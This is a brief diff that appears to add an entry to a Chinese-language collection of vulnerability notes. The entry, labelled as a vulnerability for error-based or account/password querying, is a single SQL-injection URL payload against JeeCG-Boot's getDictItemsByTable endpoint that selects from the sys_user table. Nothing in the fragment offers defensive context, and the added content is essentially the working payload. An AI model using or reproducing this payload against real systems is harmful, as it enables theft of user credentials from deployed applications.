@@ -119,3 +119,8 @@ OSS存储数据列表：
 
 
 ```
+漏洞
+```
+报错或账号密码查询
+/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
+```
